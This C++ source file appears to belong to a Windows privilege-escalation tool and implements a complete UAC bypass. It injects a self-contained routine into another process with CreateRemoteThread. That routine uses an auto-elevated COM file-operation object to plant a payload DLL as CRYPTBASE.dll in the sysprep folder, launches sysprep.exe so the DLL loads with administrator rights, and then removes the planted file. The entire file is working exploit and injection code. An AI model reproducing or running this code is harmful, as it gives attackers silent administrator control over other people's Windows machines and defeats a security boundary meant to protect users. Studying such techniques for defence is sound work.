/*++

Module Name:

inject.cpp

Abstract:

This file contains injection routines.

--*/


#include "global.h"
#include <shlobj.h>

//#define _DEBUGSHELL

typedef HRESULT (WINAPI *PFNConInitialize)(LPVOID pvReserved);
typedef VOID (WINAPI *PFNCoUninitialize)(VOID);
typedef HRESULT (WINAPI *PFNCoGetObject)(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv);
typedef HRESULT (WINAPI *PFNCoCreateInstance)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
typedef HRESULT (WINAPI *PFNSHCreateItemFromParsingName)(PCWSTR pszPath, IBindCtx *pbc, REFIID riid, void **ppv);
typedef BOOL (WINAPI *PFNShellExecuteExW)(SHELLEXECUTEINFOW *pExecInfo);


//shellcode
static DWORD WINAPI RemoteCodeFunc(
	LPVOID lpThreadParameter
	)
{
	INJECT_ARGS *pctx;
	HMODULE hModuleOle32 = NULL;
	HMODULE hModuleShell32 = NULL;

	BIND_OPTS3 bo;
	SHELLEXECUTEINFOW shinfo;
	IFileOperation *pFileOp = NULL;
	IShellItem *pSHISource = NULL;
	IShellItem *pSHIDestination = NULL;
	IShellItem *pSHIDelete = NULL;
	PFNConInitialize pCoInitialize;
	PFNCoUninitialize pCoUninitialize;
	PFNCoGetObject pCoGetObject;
	PFNCoCreateInstance pCoCreateInstance;
	PFNSHCreateItemFromParsingName pSHCreateItemFromParsingName;
	PFNShellExecuteExW pShellExecuteExW;


	if (lpThreadParameter == NULL)
		return 0;

	pctx = (PINJECT_ARGS)lpThreadParameter;

	hModuleOle32 = pctx->pfnLoadLibrary(pctx->szOle32);
	hModuleShell32 = pctx->pfnLoadLibrary(pctx->szShell32);

	if (hModuleOle32 != NULL && hModuleShell32 != NULL) {

		pCoInitialize = (PFNConInitialize)pctx->pfnGetProcAddress(hModuleOle32, pctx->szCoInitialize);
		pCoUninitialize = (PFNCoUninitialize)pctx->pfnGetProcAddress(hModuleOle32, pctx->szCoUninitialize);
		pCoGetObject = (PFNCoGetObject)pctx->pfnGetProcAddress(hModuleOle32, pctx->szCoGetObject);
		pCoCreateInstance = (PFNCoCreateInstance)pctx->pfnGetProcAddress(hModuleOle32, pctx->szCoCreateInstance);
		pSHCreateItemFromParsingName = (PFNSHCreateItemFromParsingName)pctx->pfnGetProcAddress(hModuleShell32, pctx->szSHCreateItemFPN);
		pShellExecuteExW = (PFNShellExecuteExW)pctx->pfnGetProcAddress(hModuleShell32, pctx->szShellExecuteExW);

		if (
			pCoInitialize != NULL &&
			pCoUninitialize != NULL &&
			pCoGetObject != NULL &&
			pCoCreateInstance != NULL &&
			pSHCreateItemFromParsingName != NULL &&
			pShellExecuteExW != NULL
			) {

			if (pCoInitialize(NULL) == S_OK) {

				RtlSecureZeroMemory(&bo, sizeof(bo));
				bo.cbStruct = sizeof(bo);
				bo.dwClassContext = CLSCTX_LOCAL_SERVER;

				if (
					(pctx->szEIFOMoniker && S_OK == pCoGetObject(pctx->szEIFOMoniker, &bo, *pctx->pIID_EIFO, (VOID**)&pFileOp))
					|| (pctx->pIID_EIFOClass && S_OK == pCoCreateInstance(*pctx->pIID_EIFOClass, NULL,
					CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER, *pctx->pIID_EIFO, (VOID**)&pFileOp))
					)
				{

					if (pFileOp != 0)
					if (S_OK == pFileOp->SetOperationFlags(FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION))
					if (S_OK == pSHCreateItemFromParsingName(pctx->szSourceDll, NULL, *pctx->pIID_ShellItem2, (VOID**)&pSHISource))
					if (pSHISource != 0)
					if (S_OK == pSHCreateItemFromParsingName(pctx->szElevDir, NULL, *pctx->pIID_ShellItem2, (VOID**)&pSHIDestination))
					if (pSHIDestination != 0)
					if (S_OK == pFileOp->CopyItem(pSHISource, pSHIDestination, pctx->szElevDll, NULL))
					if (S_OK == pFileOp->PerformOperations())
					{
						RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

						shinfo.cbSize = sizeof(shinfo);
						shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
						shinfo.lpFile = pctx->szElevExeFull;
						shinfo.lpParameters = pctx->szElevArgs;
						shinfo.lpDirectory = pctx->szElevDir;
						shinfo.nShow = SW_SHOW;

						if (pShellExecuteExW(&shinfo) && shinfo.hProcess != NULL)
						{
							pctx->pfnWaitForSingleObject(shinfo.hProcess, INFINITE);
							pctx->pfnCloseHandle(shinfo.hProcess);
						}

						if (pSHCreateItemFromParsingName(pctx->szElevDllFull, NULL, *pctx->pIID_ShellItem2, (VOID**)&pSHIDelete) == S_OK)
						if (pSHIDelete != 0)
						if (pFileOp->DeleteItem(pSHIDelete, NULL) == S_OK)
						{
							pFileOp->PerformOperations();
						}

					} //S_OK == pFileOp->PerformOperations()
					if (pSHIDelete) pSHIDelete->Release();
					if (pSHIDestination) pSHIDestination->Release();
					if (pSHISource) pSHISource->Release();
					if (pFileOp) pFileOp->Release();
				}
				pCoUninitialize();
			} /* pCoInitialize(NULL) == S_OK */
		}
	}
	if (hModuleShell32 != NULL) pctx->pfnFreeLibrary(hModuleShell32);
	if (hModuleOle32 != NULL) pctx->pfnFreeLibrary(hModuleOle32);

	return 0;
}

static VOID DummyRemoteCodeFuncEnd()
{
}



VOID AttempOperation(
	CONST WCHAR *szCmd,
	CONST WCHAR *szArgs,
	CONST WCHAR *szDir,
	CONST WCHAR *szPayloadPath
	)
{
	HANDLE hRemoteThread = NULL;
	HMODULE hModKernel32;
	INJECT_ARGS ia;
	PVOID pRemoteArgs;
	PVOID pRemoteFunc;

	PWCHAR pszEvelArgs;
	CONST WCHAR *pCmdArgChar;

	WCHAR szElevDir[BUFFER_LENGTH];
	WCHAR szElevDll[BUFFER_LENGTH];
	WCHAR szElevDllFull[BUFFER_LENGTH];
	WCHAR szElevExeFull[BUFFER_LENGTH];
	WCHAR szElevArgs[BUFFER_LENGTH];

	CONST BYTE *codeStartAdr = (BYTE*)&RemoteCodeFunc;
	CONST BYTE *codeEndAdr = (BYTE*)&DummyRemoteCodeFuncEnd;

	if (codeStartAdr >= codeEndAdr) {
		OutputDebugStringW(L"[UL] Unexpected memory layout");
		return;
	}

	//e.g. "C:\\Windows\\System32\\sysprep"
	lstrcpyW(szElevDir, g_ctx.szSystemDirectory);
	lstrcatW(szElevDir, TARGETDIR);

	//e.g. "CRYPTBASE.dll"
	lstrcpyW(szElevDll, TARGETDLL);

	//e.g. "C:\\Windows\\System32\\sysprep\\CRYPTBASE.dll"
	lstrcpyW(szElevDllFull, g_ctx.szSystemDirectory);
	lstrcatW(szElevDllFull, TARGETDLLPATH);

	//e.g. "C:\\Windows\\System32\\sysprep\\sysprep.exe"
	lstrcpyW(szElevExeFull, g_ctx.szSystemDirectory);
	lstrcatW(szElevExeFull, TARGETPROCESS);


	hModKernel32 = GetModuleHandleW(L"kernel32.dll");
	if (hModKernel32 == NULL) return;
	RtlSecureZeroMemory(&ia, sizeof(ia));

	ia.pfnFreeLibrary = (PFNFreeLibrary)GetProcAddress(hModKernel32, "FreeLibrary");
	ia.pfnLoadLibrary = (PFNLoadLibrary)GetProcAddress(hModKernel32, "LoadLibraryW");
	ia.pfnGetProcAddress = (PFNGetProcAddress)GetProcAddress(hModKernel32, "GetProcAddress");
	ia.pfnCloseHandle = (PFNCloseHandle)GetProcAddress(hModKernel32, "CloseHandle");
	ia.pfnWaitForSingleObject = (PFNWaitForSingleObject)GetProcAddress(hModKernel32, "WaitForSingleObject");
#ifdef _DEBUGSHELL
	ia.pfnOutputDebugStringA = (PFNOutputDebugStringA)GetProcAddress(hModKernel32, "OutputDebugStringA");
	ia.pfnOutputDebugStringW = (PFNOutputDebugStringW)GetProcAddress(hModKernel32, "OutputDebugStringW");
#endif
	RtlSecureZeroMemory(szElevArgs, BUFFER_LENGTH);

	szElevArgs[0] = '"';
	lstrcatW(szElevArgs, szCmd);
	lstrcatW(szElevArgs, L"\" \"");
	lstrcatW(szElevArgs, szDir);
	lstrcatW(szElevArgs, L"\" \""); //e.g. "C:\\windows\\system32\\cmd.exe" "C:\\windows\\system32"
	pszEvelArgs = _strendW(szElevArgs);
	for (pCmdArgChar = szArgs; *szArgs; ++szArgs) {

		if (*szArgs != L'\"') {
			*pszEvelArgs = *szArgs;
			pszEvelArgs++;
		}
		else {
			lstrcatW(szElevArgs, L"\"\"\"");
			pszEvelArgs = _strendW(szElevArgs);
		}
	}
	lstrcatW(szElevArgs, L"\"");

	ia.szSourceDll = AllocAndCopyStringW(szPayloadPath);
	ia.szElevDir = AllocAndCopyStringW(szElevDir);
	ia.szElevDll = AllocAndCopyStringW(szElevDll);
	ia.szElevDllFull = AllocAndCopyStringW(szElevDllFull);
	ia.szElevExeFull = AllocAndCopyStringW(szElevExeFull);
	ia.szElevArgs = AllocAndCopyStringW(szElevArgs);
	ia.szShell32 = AllocAndCopyStringW(L"shell32.dll");
	ia.szOle32 = AllocAndCopyStringW(L"ole32.dll");
	ia.szCoInitialize = AllocAndCopyStringA("CoInitialize");
	ia.szCoUninitialize = AllocAndCopyStringA("CoUninitialize");
	ia.szCoGetObject = AllocAndCopyStringA("CoGetObject");
	ia.szCoCreateInstance = AllocAndCopyStringA("CoCreateInstance");
	ia.szSHCreateItemFPN = AllocAndCopyStringA("SHCreateItemFromParsingName");
	ia.szShellExecuteExW = AllocAndCopyStringA("ShellExecuteExW");
	ia.szEIFOMoniker = AllocAndCopyStringW(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}");
	ia.pIID_EIFOClass = NULL;
	ia.pIID_EIFO = (CONST IID *)AllocAndCopyMemory(&__uuidof(IFileOperation), sizeof(__uuidof(IFileOperation)), FALSE);
	ia.pIID_ShellItem2 = (CONST IID *)AllocAndCopyMemory(&__uuidof(IShellItem2), sizeof(__uuidof(IShellItem2)), FALSE);
	ia.pIID_Unknown = (CONST IID *)AllocAndCopyMemory(&__uuidof(IUnknown), sizeof(__uuidof(IUnknown)), FALSE);

	pRemoteArgs = AllocAndCopyMemory(&ia, sizeof(ia), FALSE);
	pRemoteFunc = AllocAndCopyMemory(RemoteCodeFunc, codeEndAdr - codeStartAdr, TRUE);

	hRemoteThread = CreateRemoteThread(g_ctx.hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteFunc, pRemoteArgs, 0, NULL);
	if (hRemoteThread) {
		WaitForSingleObject(hRemoteThread, 10000);
		CloseHandle(hRemoteThread);
	}
}